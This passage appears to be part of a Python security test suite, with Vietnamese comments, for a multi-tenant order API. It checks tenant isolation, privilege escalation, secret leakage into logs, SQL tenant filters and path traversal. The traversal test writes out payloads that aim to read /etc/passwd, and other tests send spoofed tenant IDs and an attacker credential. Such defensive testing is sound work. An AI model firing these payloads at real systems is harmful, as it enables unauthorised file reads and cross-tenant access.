        st, _ = self._tao_don(self.a_staff)   # CÙNG cookie, không đăng nhập lại
        self.assertEqual(st, 403, "hạ quyền rồi mà phiên cũ vẫn ghi được → có cache ngữ cảnh")
        st, _ = self.a.goi(f"/api/v2/memberships/{mem['id']}", "PUT", {"role": "TENANT_STAFF"})
        self.assertEqual(st, 200)
        st, _ = self._tao_don(self.a_staff)
        self.assertEqual(st, 201, "nâng quyền lại không có hiệu lực ngay")

    def test_q09f_ANTOAN_tenant_id_trong_body_khong_doi_duoc_ngu_canh(self):
        """Mọi đường nghiệp vụ lấy tenant_id từ phiên. Bắn `tenant_id` trong body/query không
        đổi được ngữ cảnh, kể cả ở endpoint tạo (`POST /don`, `POST /khach-hang`).
        """
        st, kq = self.a.goi("/api/v2/don", "POST", dict(DON_MAU, tenant_id=self.tid_b))
        self.assertEqual(st, 201, kq)
        d = csdl.mot("SELECT tenant_id FROM don_hang WHERE id=?", (kq["don"]["id"],))
        self.assertEqual(d["tenant_id"], self.tid_a, "tenant_id trong body đã ghi đè ngữ cảnh!")
        st, kq = self.a.goi("/api/v2/khach-hang", "POST", {"ten": "KH soát", "tenant_id": self.tid_b})
        self.assertEqual(st, 201, kq)
        k = csdl.mot("SELECT tenant_id FROM khach_hang WHERE id=?", (kq["id"],))
        self.assertEqual(k["tenant_id"], self.tid_a)
        st, _ = self.a.goi(f"/api/v2/don?tenant_id={self.tid_b}")
        self.assertEqual(st, 200)

    # Sáu câu SQL KHÔNG mang điều kiện tenant, đã soát từng câu và kết luận an toàn vì ngay
    # TRƯỚC chúng có một lượt đọc đã khóa tenant (và thoát 404/raise nếu không khớp).
    # Đây là DANH SÁCH ĐƯỢC MIỄN có lý do — không phải lời bào chữa chung: câu thứ bảy xuất
    # hiện là ca thử hỏng, buộc người thêm phải giải trình.
    SQL_DUOC_MIEN = {
        # server.py — ba nhánh /tai-khoan-hang/{id}/{rotate|revoke|khoa|mo}: ngay trên là
        # SELECT ... FROM carrier_accounts WHERE id=? AND tenant_id=? rồi 404 nếu không có.
        "UPDATE carrier_accounts SET credentials_ma_hoa=?, credentials_duoi=?,"
        " credentials_doi_luc=? WHERE id=?",
        "UPDATE carrier_accounts SET credentials_ma_hoa=?, credentials_duoi='',"
        " kich_hoat=0, credentials_doi_luc=? WHERE id=?",
        "UPDATE carrier_accounts SET kich_hoat=? WHERE id=?",
        # nhap_file.duyet_batch — ngay trên là SELECT ... import_batch WHERE id=? AND tenant_id=?
        "UPDATE import_batch SET trang_thai=? WHERE id=?",
        # don_hang.ap_trang_thai_giao — Q-10 ĐÃ VÁ 15/10 (G04-L2): tenant_id nay là tham số
        # BẮT BUỘC đứng đầu, hàm tự lọc `WHERE id=? AND tenant_id=?`. Ghi chú dưới giữ lại
        # làm lịch sử của rủi ro đã đóng:
        # hàm này nhận don_id trần và không tự kiểm tenant. An toàn HÔM NAY vì cả hai người
        # gọi (webhook._xu_ly, polling.chay_mot_luot) đã giải quyết đơn theo tenant trước.
        # Người gọi thứ ba quên làm vậy sẽ thành lỗi chéo tenant mà không có gì báo.
        "SELECT * FROM don_hang WHERE id=?",
        "UPDATE don_hang SET trang_thai_giao=?, hang_trang_thai_giao=?,"
        " cap_nhat_luc=? WHERE id=?",
    }

    def test_q09g_ANTOAN_moi_cau_sql_cua_don_khach_import_deu_co_tenant(self):
        """Soát TĨNH: đếm câu SQL đọc/ghi bảng có cột tenant_id mà thiếu điều kiện tenant.

        Phạm vi đã đo (§12.1 luật 5): bốn file `server.py`, `don_hang.py`, `nhap_file.py`,
        `polling.py`; bốn bảng `don_hang`, `khach_hang`, `import_batch`, `carrier_accounts`;
        chỉ các câu SQL viết thẳng trong mã (không dựng động). NGOÀI phạm vi: `audit`,
        `wh_su_kien`, `don_lich_su`, `import_dong`, `usage_thang` (các bảng này gắn tenant
        gián tiếp qua khóa ngoài), và câu SQL ghép chuỗi động.

        Kết quả lượt đo đầu (14/10/2026): đúng 6 câu thiếu điều kiện tenant, soát từng câu
        thấy đều có lượt đọc khóa tenant đứng ngay trên → nằm trong `SQL_DUOC_MIEN`.
        """
        import re
        bang = ("don_hang", "khach_hang", "import_batch", "carrier_accounts")
        thieu = []
        for ten in ("server.py", "don_hang.py", "nhap_file.py", "polling.py"):
            nguon = open(os.path.join(GOC_APP, ten), encoding="utf-8").read()
            # gom chuỗi SQL (kể cả chuỗi nối nhiều dòng) theo từng lệnh csdl.*
            for m in re.finditer(r"csdl\.(?:mot|nhieu|ghi)\(\s*((?:\s*\"[^\"]*\"|\s*'[^']*')+)", nguon):
                sql = " ".join(re.findall(r"\"([^\"]*)\"|'([^']*)'", m.group(1))[i][j]
                               for i, x in enumerate(re.findall(r"\"([^\"]*)\"|'([^']*)'", m.group(1)))
                               for j in (0, 1) if x[j])
                nen = " ".join(sql.split())
                if not any(b in nen for b in bang):
                    continue
                # PRAGMA đọc SIÊU DỮ LIỆU schema (tên cột), KHÔNG đọc một dòng dữ liệu nào,
                # nên không thể rò dữ liệu tenant dù có nhắc tên bảng. Bỏ qua là an toàn:
                # quên một PRAGMA không gây lộ gì. (AG-00 thêm 14/10/2026 sau khi AG-04 dùng
                # PRAGMA table_info(import_batch) để dò schema cũ.)
                if nen.upper().startswith("PRAGMA"):
                    continue
                if nen.upper().startswith("INSERT"):
                    continue          # INSERT cấp tenant_id làm giá trị, không phải điều kiện
                if "tenant_id" in nen:
                    continue
                if nen in {" ".join(x.split()) for x in self.SQL_DUOC_MIEN}:
                    continue
                thieu.append((ten, nen[:140]))
        self.assertEqual(
            thieu, [],
            "câu SQL MỚI chạm bảng có tenant_id mà không có điều kiện tenant, và chưa có lý do "
            "trong SQL_DUOC_MIEN: " + "; ".join(f"{f}: {s}" for f, s in thieu))

    def test_q09m_ANTOAN_khong_rotate_hay_khoa_duoc_tai_khoan_hang_cua_tenant_khac(self):
        """Bằng chứng ĐỘNG cho ba câu `UPDATE carrier_accounts ... WHERE id=?` được miễn ở
        `SQL_DUOC_MIEN`: lượt đọc khóa tenant đứng trên chúng có thật sự chặn hay không.

        Bộ thử cũ (test_020) chỉ kiểm rotate đổi được credentials của CHÍNH mình; chưa có ca
        nào bắn rotate/revoke/khóa vào tài khoản hãng của tenant khác.
        """
        truoc = csdl.mot("SELECT credentials_ma_hoa, kich_hoat FROM carrier_accounts WHERE id=?",
                         (self.tk_b["id"],))
        for viec, du_lieu in (("rotate", {"credentials": {"api_key": "cua-ke-tan-cong"}}),
                              ("revoke", {}), ("khoa", {}), ("mo", {})):
            st, _ = self.a.goi(f"/api/v2/tai-khoan-hang/{self.tk_b['id']}/{viec}", "POST", du_lieu)
            self.assertEqual(st, 404, f"tenant A gọi được {viec} trên tài khoản hãng của B!")
        sau = csdl.mot("SELECT credentials_ma_hoa, kich_hoat FROM carrier_accounts WHERE id=?",
                       (self.tk_b["id"],))
        self.assertEqual(tuple(truoc), tuple(sau), "tài khoản hãng của B bị đổi!")
        self.assertEqual(
            bao_mat.giai_ma_cred(sau["credentials_ma_hoa"], self.tid_b, "vtp")["api_key"],
            "soat-key-cua-B-6666")

    def test_q09h_ANTOAN_secret_khong_lot_vao_audit_hay_phan_hoi(self):
        """Quét `audit`, `don_lich_su`, `wh_su_kien.loi_cuoi` và phản hồi API tìm credentials
        hãng, mật khẩu người dùng, webhook secret. Phạm vi: các secret do CHÍNH bộ thử này
        nạp vào; không chứng minh được cho secret của luồng khác.
        """
        bi_mat = ("soat-key-cua-A-7777", "soat-key-cua-B-6666", MK,
                  self.tk_a["webhook_secret_mot_lan"], self.tk_b["webhook_secret_mot_lan"])
        gom = []
        for sql in ("SELECT chi_tiet, doi_tuong, hanh_dong FROM audit",
                    "SELECT noi_dung, nguon FROM don_lich_su",
                    "SELECT loi_cuoi, headers_json FROM wh_su_kien"):
            for r in csdl.nhieu(sql):
                gom.append(" ".join(str(v) for v in tuple(r) if v is not None))
        for duong in ("/api/v2/audit", "/api/v2/tai-khoan-hang", "/api/v2/webhook/su-kien",
                      "/api/v2/auth/toi", "/api/v2/billing"):
            st, kq = self.a.goi(duong)
            gom.append(json.dumps(kq, ensure_ascii=False, default=str))
        gom.append(LOG_SERVER.getvalue())
        kho = "\n".join(gom)
        for s in bi_mat:
            self.assertNotIn(s, kho, f"secret lọt ra: {s[:12]}…")

    def test_q09i_ANTOAN_headers_json_luu_chu_ky_nhung_khong_lo_ra_api(self):
        """Đã kiểm — mối lo thật nhưng không phải lỗ hổng: `wh_su_kien.headers_json` lưu
        NGUYÊN header của yêu cầu webhook, gồm `x-webhook-signature`. Chữ ký không phải secret
        (nó là HMAC của body), và không endpoint nào trả `headers_json` ra ngoài.

        Nếu sau này thêm màn 'xem chi tiết sự kiện' thì phải lọc trường này — ghi ra để không
        mất dấu. Ca này canh chính điều đó: API không được trả headers_json.
        """
        sk = csdl.mot("SELECT headers_json FROM wh_su_kien ORDER BY id DESC LIMIT 1")
        if sk is None:
            self.skipTest("chưa có sự kiện webhook nào trong CSDL thử")
        self.assertIn("x-webhook-signature", sk["headers_json"].lower(),
                      "tiền đề đổi: headers_json không còn lưu chữ ký")
        st, kq = self.a.goi("/api/v2/webhook/su-kien")
        self.assertEqual(st, 200)
        self.assertNotIn("headers_json", json.dumps(kq),
                         "API đã bắt đầu trả headers_json ra ngoài")

    def test_q09j_ANTOAN_leo_thang_dac_quyen_qua_membership_bi_chan(self):
        """Đường leo thang chưa có ca thử: TENANT_ADMIN tự nâng mình/người khác lên
        TENANT_OWNER hoặc PLATFORM_OWNER qua `POST /memberships`.
        """
        assert self.a.goi("/api/v2/memberships", "POST",
                          {"ten_dang_nhap": "a-admin", "mat_khau": MK,
                           "role": "TENANT_ADMIN"})[0] == 201
        p = tao_phien("a-admin", MK)
        for role in ("TENANT_OWNER", "PLATFORM_OWNER", "PLATFORM_ADMIN"):
            st, _ = p.goi("/api/v2/memberships", "POST",
                          {"ten_dang_nhap": f"leo-{role}", "mat_khau": MK, "role": role})
            self.assertEqual(st, 403, f"TENANT_ADMIN cấp được vai trò {role}!")
        u = csdl.mot("SELECT platform_role FROM users WHERE ten_dang_nhap='a-admin'")
        self.assertIsNone(u["platform_role"], "a-admin có platform_role!")

    def test_q09k_ANTOAN_khong_doi_duoc_tenant_khong_co_membership(self):
        """`/auth/doi-tenant` xác minh membership — bắn id tenant lạ không vào được."""
        st, _ = self.a.goi("/api/v2/auth/doi-tenant", "POST", {"tenant_id": self.tid_b})
        self.assertEqual(st, 403, "A đổi được sang tenant B!")
        st, kq = self.a.goi("/api/v2/auth/toi")
        self.assertEqual(kq["tenant"]["id"], self.tid_a)

    def test_q09l_ANTOAN_khong_doc_duong_dan_ngoai_repo_qua_static(self):
        """Đã kiểm — không phải lỗ hổng: `os.path.normpath` + `lstrip("/")` chặn `..`, và
        `self.path` KHÔNG được urldecode nên `%2e%2e` cũng không thoát ra ngoài gốc repo.
        Khác hẳn Q-02: Q-02 là lộ file TRONG repo, ca này là thoát RA NGOÀI repo.
        """
        la = Phien()
        for duong in ("/../../../../etc/passwd", "/%2e%2e/%2e%2e/etc/passwd",
                      "/..%2f..%2fetc/passwd", "/....//....//etc/passwd"):
            st, raw = la.goi(duong)
            self.assertNotEqual(st, 200, f"{duong} đọc được file ngoài repo!")


if __name__ == "__main__":
    unittest.main(verbosity=2)
